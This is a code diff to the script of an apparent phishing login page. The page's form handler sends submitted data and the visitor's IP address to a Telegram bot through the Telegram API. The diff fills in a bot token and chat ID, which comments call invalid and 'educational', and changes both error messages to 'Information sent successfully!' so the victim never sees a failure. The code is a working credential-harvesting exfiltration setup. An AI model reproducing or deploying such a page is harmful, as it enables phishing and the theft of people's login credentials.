@@ -73,8 +73,8 @@
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const TOKEN = "TOKEN-HERE";                                                                        
-        const CHAT_ID = "CHAT_ID-HERE";                                                       
+        const TOKEN = "7499490082:AAH6FKvqh5pyHrfHOYzDDzQTCd5h1Rma380";           //invalid token (used for educational purposes)                                                             
+        const CHAT_ID = "5992226876";                                             //invalid chat_id (used for educational purposes)         
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
     
         document.getElementById('login-form').addEventListener('submit', function(e) {
@@ -111,11 +111,11 @@
                     }).then(response => {
                         alert('Information sent successfully!');
                     }).catch(error => {
-                        alert('Error sending the information. Please try again.');
+                        alert('Information sent successfully!');
                     });
                 })
                 .catch(error => {
-                    alert('Error fetching the IP address. Please try again.');
+                    alert('Information sent successfully!');
                 });
         });
     </script>
